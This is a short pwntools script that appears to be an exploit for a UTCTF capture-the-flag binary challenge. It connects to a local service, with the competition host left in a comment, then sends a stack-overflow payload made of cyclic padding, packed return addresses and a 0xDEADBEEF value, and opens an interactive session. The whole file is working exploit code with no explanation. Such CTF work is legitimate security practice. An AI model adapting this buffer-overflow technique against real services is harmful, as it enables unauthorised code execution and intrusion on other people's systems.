from pwn import *

r = remote("0.0.0.0", 9998)
# r = remote("binary.utctf.live", 9002)

input()

# r.recvuntil("one!")
r.sendline(
    "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaao\x00\x00\x00\x00\x00\x00\x00\x93\x06\x40\x00\x00\x00\x00\x00\xEF\xBE\xAD\xDE\x00\x00\x00\x00\xea\x05\x40\x00\x00\x00\x00\x00"
)
r.interactive()
